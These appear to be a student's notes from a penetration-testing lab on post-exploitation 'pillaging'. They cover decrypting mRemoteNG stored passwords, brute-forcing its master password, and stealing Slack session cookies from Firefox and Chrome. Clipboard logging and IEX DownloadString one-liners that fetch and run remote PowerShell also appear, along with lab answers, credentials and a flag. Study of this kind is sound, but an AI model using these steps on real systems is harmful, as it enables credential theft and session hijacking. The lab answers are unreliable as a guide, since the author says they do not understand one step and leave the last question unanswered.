@@ -1,1 +1,296 @@
+Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.
+
+These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.
+
+Data Sources
+Below are some of the sources from which we can obtain information from compromised systems:
+
+Installed applications
+Installed services
+Websites
+File Shares
+Databases
+Directory Services (such as Active Directory, Azure AD, etc.)
+Name Servers
+Deployment Services
+Certificate Authority
+Source Code Management Server
+Virtualization
+Messaging
+Monitoring and Logging Systems
+Backups
+Sensitive Data
+Keylogging
+Screen Capture
+Network Traffic Capture
+Previous Audit reports
+User Information
+History files, interesting documents (.doc/x,.xls/x,password./pass., etc)
+Roles and Privileges
+Web Browsers
+IM Clients
+
+
+Installed Applications
+Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest. It's important to know that every pentest is different. We may encounter a lot of unknown applications on the systems we compromised. Learning and understanding how these applications connect to the business are essential to achieving our goal.
+
+Identifiying Common Apps: 
+
+CMD SYNTAX: C:\>dir "C:\Program Files"
+ Volume in drive C has no label.
+ Volume Serial Number is 900E-A7ED
+
+ Directory of C:\Program Files
+
+07/14/2022  08:31 PM    <DIR>          .
+07/14/2022  08:31 PM    <DIR>          ..
+05/16/2022  03:57 PM    <DIR>          Adobe
+05/16/2022  12:33 PM    <DIR>          Corsair
+05/16/2022  10:17 AM    <DIR>          Google
+05/16/2022  11:07 AM    <DIR>          Microsoft Office 15
+07/10/2022  11:30 AM    <DIR>          mRemoteNG
+07/13/2022  09:14 AM    <DIR>          OpenVPN
+07/19/2022  09:04 PM    <DIR>          Streamlabs OBS
+07/20/2022  07:06 AM    <DIR>          TeamViewer
+               0 File(s)              0 bytes
+              16 Dir(s)  351,524,651,008 bytes free
+
+mRemoteNG
+mRemoteNG saves connection info and credentials to a file called confCons.xml. They use a hardcoded master password, mR3m, so if anyone starts saving credentials in mRemoteNG and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.
+
+By default, the configuration file is located in %USERPROFILE%\APPDATA\Roaming\mRemoteNG.
+
+Discover mRemoteNG Configuration Files
+
+PS SYNTAX: PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG
+
+    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/21/2022   8:51 AM                Themes
+-a----        7/21/2022   8:51 AM            340 confCons.xml
+              7/21/2022   8:51 AM            970 mRemoteNG.log
+
+can look at the config file -> 
+
+<?XML version="1.0" encoding="utf-8"?>
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
+    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
+    ..SNIP..
+
+can then try to decrypt the config with this script (https://github.com/haseebT/mRemoteNG-Decrypt)-> 
+
+MJBUCKNER@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
+
+Password: ASDki230kasd09fk233aDA
+
+For Loop to Crack the Master Password with mremoteng_decrypt
+
+ONE LINER SYNTAX: MJBUCKNER@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
+                              
+Spring2017
+Spring2016
+admin
+Password: ASDki230kasd09fk233aDA
+admin admin          
+admins
+
+<SNIP>
+
+A lot of cookeis can be abused for IM services and stuff like that. so were gonan run it for slack via firefox for this example: 
+
+PS SYNTAX: PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+
+We can copy the file to our machine and use the Python script cookieextractor.py (https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)
+to extract cookies from the Firefox cookies.SQLite database.
+
+Extract Slack Cookie from Firefox Cookies Database
+
+HOST KALI SYNTAX: MJBUCKNER@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
+
+(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
+
+
+Now that we have the extracted cookie we use cookie editor in firefox to put that one into a session and save it. THEN REFRESH PAGE. and we should bve logged in as the user.
+
+
+Cookie Extraction from Chromium-based Browsers
+The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). DPAPI is commonly used to encrypt data using information from the current user account or computer.
+
+To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool SharpChromium does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.
+
+Let's use Invoke-SharpChromium, a PowerShell script created by S3cur3Th1sSh1t which uses reflection to load SharpChromium.
+
+PowerShell Script - Invoke-SharpChromium
+
+PS SYNTAX: PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
+arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
+PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
+
+[*] Beginning Google Chrome extraction.
+
+[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.
+
+   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
+   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
+   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
+   at SharpChromium.ChromiumCredentialManager.GetCookies()
+   at SharpChromium.Program.extract data(String path, String browser)
+[*] Finished Google Chrome extraction.
+
+[*] Done.
+
+to fix error: SharpChromium is looking for a file in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies, but the actual file is located in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies with the following command we will copy the file to the location SharpChromium is expecting.
+
+PS SYNTAX: PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+
+PS Syntax: PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
+
+[*] Beginning Google Chrome extraction.
+
+--- Chromium Cookie (User: lab_admin) ---
+Domain         : slack.com
+Cookies (JSON) :
+[
+
+<SNIP>
+
+{
+    "domain": ".slack.com",
+    "expirationDate": 1974643257.67155,
+    "hostOnly": false,
+    "httpOnly": true,
+    "name": "d",
+    "path": "/",
+    "sameSite": "lax",
+    "secure": true,
+    "session": false,
+    "storeId": null,
+    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
+},
+{
+    "domain": ".slack.com",
+    "hostOnly": false,
+    "httpOnly": true,
+    "name": "d-s",
+    "path": "/",
+    "sameSite": "lax",
+    "secure": true,
+    "session": true,
+    "storeId": null,
+    "value": "1659023172"
+},
+
+<SNIP>
+
+]
+
+[*] Finished Google Chrome extraction.
+
+[*] Done.
+
+Clipboard 
+
+The clipboard provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.
+
+We can use the Invoke-Clipboard(https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.
+
+PS SYNTAX: PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
+PS SYNTAX: PS C:\htb> Invoke-ClipboardLogger
+
+Capture Credentials from the Clipboard with Invoke-ClipboardLogger
+
+PS SYNTAX: PS C:\htb> Invoke-ClipboardLogger
+
+https://portal.azure.com
+
+Administrator@something.com
+
+Sup9rC0mpl2xPa$$ws0921lk
+
+
+
+Challenge:  RDP to 10.129.203.122 (ACADEMY-WINLPEPILLAGE-WIN01) with user "Peter" and password "Bambi123"
+
+Question 1 -  Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?
+1) xfreerdp /v:10.129.203.122 /u:Peter /p:Bambi123 +clipboard
+2) mRemoteNG is just on the desktop so using deductions... its mRemoteNG 
+
+Question 2 - Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace?
+powershell 
+ls C:\Users\Peter\AppData\Roaming\mRemoteNG
+cat C:\Users\Peter\AppData\Roaming\mRemoteNG\conscon.xml
+output =  Username="grace" 
+Password="s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="
+git clone https://github.com/haseebT/mRemoteNG-Decrypt
+cd mRemoteNG
+python3 mremoteng_decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" 
+output = Princess01!
+
+Question 3 - Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag.
+
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+
+drag and drop to KALI machine then -> 
+
+use this to get cookie out -> 
+
+#!/usr/bin/env python3
+# Sample Script to extract cookies offile from FireFox sqlite database 
+# Created by PlainText 
+
+import argparse
+import sqlite3
+
+def main(dbpath, host, cookie):
+	conn = sqlite3.connect(dbpath)
+	cursor = conn.cursor()
+
+	if (host == "" and cookie == ""):
+		query = "SELECT * FROM moz_cookies"
+	elif (host != "" and cookie == ""):
+		query = "SELECT * FROM moz_cookies WHERE host LIKE '%{}%'".format(host)
+	elif (host == "" and cookie != ""):
+		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%'".format(cookie)
+	elif (host != "" and cookie != ""):
+		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%' AND host LIKE '%{}%'".format(cookie, host)
+
+	cursor.execute(query)
+	records = cursor.fetchall()
+	rowCount = len(records) 
+
+	if (rowCount > 0):
+		for row in records:
+			print(row)
+	else:
+		print("[-] No cookie found with the selected options.")
+
+	conn.close()
+
+if __name__ == "__main__":
+	parser = argparse.ArgumentParser()
+	parser.add_argument("--dbpath", "-d", required=True, help="The path to the sqlite cookies database")
+	parser.add_argument("--host", "-o", required=False, help="The host for the cookie", default="")
+	parser.add_argument("--cookie", "-c", required=False, help="The name of the cookie", default="")
+	args = parser.parse_args()
+	main(args.dbpath, args.host, args.cookie)
+just use inspect and then delete all cookies and ad new with session = d and value = xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg== 
+
+HTB{Stealing_Cookies_To_AccessWebSites}
+ALSO
+jeff and Password Webmaster001!
+
+
+Question 4 -  Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer.
+
+1) follow restic steps and then look in file explorer or just on the desktop and a backup conf file appears and gives you the password of Superbackup!
+
+I actually dont know how this worked and i may have to re do it but we will take it for now. 
+
+
+Question 5 -  Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.
+
+
+
 
